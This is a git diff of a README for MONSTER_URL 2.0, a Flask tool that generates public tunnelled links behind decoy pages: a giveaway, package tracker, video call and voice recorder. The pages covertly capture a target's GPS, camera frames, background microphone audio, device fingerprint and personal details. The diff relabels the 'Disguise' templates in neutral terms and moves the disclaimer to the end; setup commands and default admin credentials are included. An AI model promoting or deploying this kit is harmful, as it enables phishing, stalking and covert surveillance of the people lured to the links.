@@ -1,4 +1,4 @@
-# 👾 MONSTER_URL 2.0 — Advanced Target & Public URL Hub
+# 👾 MONSTER_URL 2.0 — Advanced Device Telemetry & Target Console
 
 <p align="center">
   <img src="https://img.shields.io/badge/Version-2.0.0-00ff88?style=for-the-badge&logo=appveyor" alt="Version 2.0">
@@ -17,89 +17,93 @@
 
 ---
 
-## ⚠️ Legal & Ethical Disclaimer
+## 📸 Interface Preview & Console Screenshots
 
-> **IMPORTANT NOTICE:** This tool is designed strictly for **educational, academic final-year project demonstration, authorized security testing, and research purposes**. 
-> The developer (**Mohammad Fahad**) and contributors assume no liability and are not responsible for any misuse, illegal activities, or unauthorized testing conducted with this software. Always obtain explicit permission before testing on any system or device.
+<p align="center">
+  <img src="screenshots/1.jpg" alt="Admin Dashboard Overview" width="90%">
+  <br><sub><b>Figure 1: Admin Console Overview & Real-Time Target Activity Log</b></sub>
+</p>
 
----
+<p align="center">
+  <img src="screenshots/2.jpg" alt="Live Target Map & GPS Telemetry" width="90%">
+  <br><sub><b>Figure 2: Interactive Live Target GPS Map & Accuracy Monitoring</b></sub>
+</p>
 
-## 🚀 Overview & Key Features
+<p align="center">
+  <img src="screenshots/3.jpg" alt="Media Vault & Audio Player" width="90%">
+  <br><sub><b>Figure 3: Media Vault & Audio Player Console</b></sub>
+</p>
 
-**MONSTER_URL 2.0** is an advanced multi-platform web application built with **Flask** and **Vanilla JavaScript**. It generates shareable, token-based public links that allow users to collect and monitor real device telemetry, GPS location, hardware footprints, camera snapshots, microphone audio, and participant form submissions in real time from a centralized admin console.
-
-### 🌟 What's New in MONSTER_URL 2.0:
-
-- 🌐 **Persistent Public HTTPS Tunnels**: Built-in `TunnelManager` automatically establishes and maintains free public HTTPS tunnels (Cloudflare TryCloudflare / Serveo SSH) with continuous auto-reconnection so your links stay active without manual port forwarding.
-- 📱 **100% Fully Responsive UI**: Meticulously designed for mobile phones, tablets, and PCs. Smooth glassmorphism aesthetic with cyberpunk neon styling (`#070b12` dark background, glowing green/cyan accents).
-- 🎮 **Real Device Hardware Footprinting**: Captures WebGL GPU renderer details (`WEBGL_debug_renderer_info`), screen resolution & pixel ratio, RAM estimate (`navigator.deviceMemory`), CPU logical core count (`navigator.hardwareConcurrency`), timezone, User-Agent, and client IP.
-- 🎁 **Contest & Giveaway Entry Form Template**: Includes a participant form (`contest`) capturing Full Name, Social Username (`@username`), Phone Number, and Entry Description paragraph, complete with a 24-hour winner selection notice.
-- 📝 **User Opinion & Feedback Form Template**: Dedicated survey template (`survey`) for user feedback collection.
-- 💻 **All-in-One Diagnostic Template**: A unified system test template (`diag`) that executes GPS, Camera, Microphone, and Hardware footprinting upon interaction.
-- 📁 **Media Vault with Download & Deletion**: View captured photos and voice recordings, stream audio, download files in 1-click, and delete individual or all media records.
-- 🗑️ **Log & Record Management**: Individual deletion and bulk "Clear All" features across report logs, participant submissions, and media vaults.
-- ⚙️ **Dashboard Password Settings**: Admin credential manager inside the settings panel to update admin username and password dynamically.
-- 📱 **QR Code Generator**: Automatic mobile QR code generation for every link.
-- 🔔 **Toggleable Audio Alert**: Optional audio chime whenever a target interacts or sends reports.
+<p align="center">
+  <img src="screenshots/4.jpg" alt="Responsive Mobile Console View" width="90%">
+  <br><sub><b>Figure 4: Full Responsive Console & Landing Page View</b></sub>
+</p>
 
 ---
 
-## 📁 Repository Structure
+## ⚡ System Potential & Full Capabilities
 
-```text
-MONSTER URL/
-├── app.py              # Main Flask application & TunnelManager logic
-├── monster.py          # Interactive Python launcher with auto-downloader
-├── monster.bat         # One-click Batch script for Windows
-├── monster.sh          # Shell execution script for Linux & Android Termux
-├── requirements.txt    # Required Python dependencies
-├── README.md           # Documentation & project guide
-├── bin/                # Standalone binaries (auto-downloaded cloudflared)
-├── uploads/            # Captured media files storage
-└── templates/          # Jinja2 HTML templates
-    ├── client.html     # Client-side target landing page (all themes)
-    ├── dashboard.html  # Admin tracking console
-    └── login.html      # Secure admin login screen
-```
+**MONSTER_URL 2.0** is a full-featured, multi-platform device telemetry and web testing hub built with **Flask** and **Vanilla JavaScript**. It generates tokenized session URLs to capture and inspect comprehensive real device footprint metrics, location data, camera frames, and microphone audio streams in real time.
+
+### 🔬 Captured Telemetry & Technical Potential:
+
+1. **Hardware Footprint Extraction**:
+   - **WebGL Renderer & GPU Model**: Unmasks physical graphics hardware via `WEBGL_debug_renderer_info` (e.g. NVIDIA, AMD, Qualcomm Adreno, Apple GPU).
+   - **Display Parameters**: Captures physical screen width, height, color depth, and device pixel ratio (`window.devicePixelRatio`).
+   - **Hardware Specifications**: Estimates available device RAM (`navigator.deviceMemory`) and logical CPU core count (`navigator.hardwareConcurrency`).
+   - **System Environment**: Resolves client timezone, system language, User-Agent, and client IP address.
+
+2. **Geolocation Fixes**:
+   - High-accuracy continuous GPS tracking (`navigator.geolocation`) reporting latitude, longitude, positioning accuracy radius (meters), speed, heading, and altitude.
+   - Interactive Leaflet dark tile map rendering with live target markers.
+
+3. **Multi-Media Ingestion**:
+   - Automated front camera frame captures saved as high-quality JPEG images (`.jpg`).
+   - Continuous background microphone audio stream recording saved as WebM audio (`.webm`).
+   - Media Vault interface with full-screen image lightbox, embedded custom audio player, 1-click file downloads, and deletion controls.
+
+4. **Public HTTPS Tunnel Integration**:
+   - Integrated `TunnelManager` engine that auto-launches free public HTTPS tunnels (Cloudflare TryCloudflare / Serveo SSH) with continuous auto-reconnection. Generated URLs function globally without manual router port forwarding.
+
+5. **Cross-Platform Responsive Architecture**:
+   - Cyberpunk 2.0 glassmorphism UI designed for full fluid responsiveness across mobile phones, tablets, and desktop displays.
 
 ---
 
-## 🛠️ Installation & Setup
+## 🛠️ Installation & Setup Guide
 
-### 📦 1. Install Python Dependencies
+### 🪟 Windows Setup Guide
 
-Run pip installation command:
+1. **Download the Repository ZIP**:
+   - Click the green **`Code`** button at the top right of this GitHub page.
+   - Select **`Download ZIP`**.
+
+2. **Extract the ZIP Folder**:
+   - Right-click the downloaded `MONSTER_URL-main.zip` file.
+   - Select **`Extract All...`** and extract it to your desired folder location.
+
+3. **Install Requirements & Launch**:
+   - Open the extracted `MONSTER_URL-main` folder.
+   - Double-click **`monster.bat`** (or open Command Prompt / PowerShell in the directory and run `python monster.py`).
+   - `monster.py` will automatically verify Python packages (`flask`, `requests`) and launch the server.
+
+---
+
+### 🐧 Linux Setup Guide
+
+Open terminal in the project directory and execute:
 
 ```bash
 pip install -r requirements.txt
-```
-
----
-
-### 🪟 Running on Windows
-
-Double-click **`monster.bat`** or execute in Command Prompt / PowerShell:
-
-```cmd
-python monster.py
-```
-
----
-
-### 🐧 Running on Linux
-
-Open terminal and execute:
-
-```bash
 chmod +x monster.sh
 ./monster.sh
 ```
 
 ---
 
-### 📱 Running on Android (Termux)
+### 📱 Android Setup Guide (Termux)
 
-In the Termux application, run:
+Open the Termux application and execute:
 
 ```bash
 pkg update && pkg install -y python git openssh
@@ -111,41 +115,39 @@ bash monster.sh
 
 ---
 
-## 🔑 Admin Console Credentials
+## 🔑 Admin Console Access
 
-Access your dashboard locally at **`http://127.0.0.1:5000`** or through your live **Public HTTPS Tunnel URL**:
+Access your local dashboard at **`http://127.0.0.1:5000`** or over your generated **Public HTTPS Host**:
 
 | Setting | Default Value |
 | :--- | :--- |
 | **Default Username** | `admin` |
 | **Default Password** | `admin` |
 
-> ⚙️ *You can update your username and password anytime from the **Settings ⚙️** tab inside the Dashboard.*
+> ⚙️ *Admin credentials can be changed anytime in the **Settings ⚙️** panel inside the Dashboard.*
 
 ---
 
-## 🎭 Disguise Landing Templates
+## 📋 Available Landing Templates
 
 | Template | Icon | Description |
 | :--- | :---: | :--- |
-| **System Diagnostic** | 💻 | Unified hardware readiness test (GPS + Camera + Mic + Footprint). |
-| **Contest & Giveaway** | 🎁 | Official giveaway draw entry form with 24-hour winner notice. |
-| **Feedback Survey** | 📝 | User feedback & opinion submission form. |
-| **Package Tracking** | 📦 | Simulated express package delivery & transit map tracker. |
-| **Video Call Meeting** | 🎥 | Interactive live video call interface. |
-| **Voice Note** | 🎙 | Private encrypted audio recorder landing page. |
+| **System Hardware Diagnostic** | 💻 | Unified hardware readiness test (GPS + Camera + Mic + Footprint). |
+| **Giveaway Participant Form** | 🎁 | Official participant submission form with 24-hour result notice. |
+| **User Feedback Survey** | 📝 | Standard user feedback & opinion intake form. |
+| **Express Order Tracker** | 📦 | Package delivery & transit map visualization landing page. |
+| **Video Meeting Room** | 🎥 | Interactive video meeting page interface. |
+| **Encrypted Voice Recorder** | 🎙 | Encrypted audio recording page layout. |
 
 ---
 
-## 👨‍💻 Developer & Credits
+## ⚠️ Legal & Ethical Disclaimer
 
-Designed & Developed by **Mohammad Fahad**
-
-- 🐙 **GitHub**: [@Dr-MrBot](https://github.com/Dr-MrBot)
-- 📸 **Instagram**: [@dr_mr.bot](https://www.instagram.com/dr_mr.bot/)
+> **IMPORTANT LEGAL DISCLAIMER:** This software is developed solely for **academic research, final-year project demonstration, authorized system telemetry analysis, and educational testing** on systems you own or have explicit authorization to monitor. 
+> The developer (**Mohammad Fahad**) and contributors take **no responsibility** and disclaim all liability for any improper, unauthorized, or illegal use of this software. Users are required to comply with all applicable local, national, and international privacy laws.
 
 ---
 
 ## 📜 License
 
-Distributed under the MIT License. See `LICENSE` for more information.
+Distributed under the MIT License. See `LICENSE` for details.
